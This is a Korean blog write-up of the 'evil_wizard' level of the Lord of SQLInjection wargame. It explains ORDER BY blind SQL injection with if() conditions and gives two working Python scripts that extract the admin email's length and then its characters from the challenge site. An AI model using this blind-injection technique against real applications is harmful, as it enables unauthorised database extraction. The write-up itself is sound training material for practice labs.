---
layout: single
title: "[Lord of SQLInjection] evil_wizard write-up"
date: 2025-05-03 19:30 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (evil_wizard)

### 풀이

이번 문제에서는 전 문제 hell_fire와 유사한데 sleep과 benchmark를 더 필터링하면서 time blind sqli가 안되는 것을 알 수 있다.

![image-20250503191955232](/images/2025-05-03-los-evil_wizard/image-20250503191955232.png)

<br>

order 파라미터에 1을 넣어봐서 어떻게 정렬되는지 살펴보면 이번에는 admin score 값이 50으로 바뀌어서 먼저 정렬되는 것을 알 수 있다.

![image-20250503192242255](/images/2025-05-03-los-evil_wizard/image-20250503192242255.png)

<br>

아래와 같이 case when 조건 절을 사용해서 admin이면 2를 만들고 rubiya 계정이면 1을 만들어서 확인해보면 case when 조건절은 잘 동작된다는 것을 알 수 있다.

![image-20250503192708362](/images/2025-05-03-los-evil_wizard/image-20250503192708362.png)

<br>

그래서 전에 했던 hell_fire 방식과 동일하게 이번엔 admin email 조건에서 then 2 로 바꾸고 인덱스를 찍어보니 and substr 로 다 찍어보니 거짓임에도 admin 행이 2로 다 참이 되서 찍힌다..

![image-20250503194155698](/images/2025-05-03-los-evil_wizard/image-20250503194155698.png)

<br>

case when 절이 잘 안돼서 if 문으로 다시 시도해보았다. 아래 쿼리를 보면 해당 조건이 거짓인데 아예 출력이 안되진 않고, rubiya 계정이 먼저 나온다는 것을 알 수 있다. 참이면 admin 계정이 먼저 나오므로 이를 토대로  blind sqli를 시도해보자.

![image-20250503202833433](/images/2025-05-03-los-evil_wizard/image-20250503202833433.png)

<br>

계속 and ascii(substr))로 시도하려니까 잘 안되는 거 같아서 아래 코드로 email 길이부터 구해보면 30이라는 것을 알 수 있다.

```python
import requests
import time

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookie = {"PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"}
email = ""

for i in range(1, 100):
    param = {
        "order": f"if(id='admin' and length(email)>{i},1,10000)-- -"
        }
    r = requests.get(url=url, cookies=cookie, params=param)
    admin_index = r.text.find("50")
    rubiya_index = r.text.find("100")
    #print(f"admin: {admin_index}, rubiya: {rubiya_index}")
    if admin_index > rubiya_index:
        print(i)
        break
    

```

<br>

비밀번호 길이를 구했으므로 아래 조건이 참이면 admin이 위로 올라오고 아니면  rubiya 계정이 위로 올라오므로 index 값을 계산해서 blind sqli 코드를 짜주면 되겠다.

```python
import requests
import time

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookie = {"PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"}
email = ""

for i in range(1, 31):
    for j in range(32, 127):
        param = {
            "order": f"if(id='admin' and ascii(substr(email,{i},1))={j},1,10000)-- -"
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        admin_index = r.text.find("50")
        rubiya_index = r.text.find("100")
        # print(f"admin: {admin_index}, rubiya: {rubiya_index}")
        if admin_index < rubiya_index:
            print(f"email {i}번째는 {chr(j)}입니다.")
            email += chr(j)
            break            
print(email)

```

<br>

![image-20250503205403355](/images/2025-05-03-los-evil_wizard/image-20250503205403355.png)

![image-20250503205429798](/images/2025-05-03-los-evil_wizard/image-20250503205429798.png)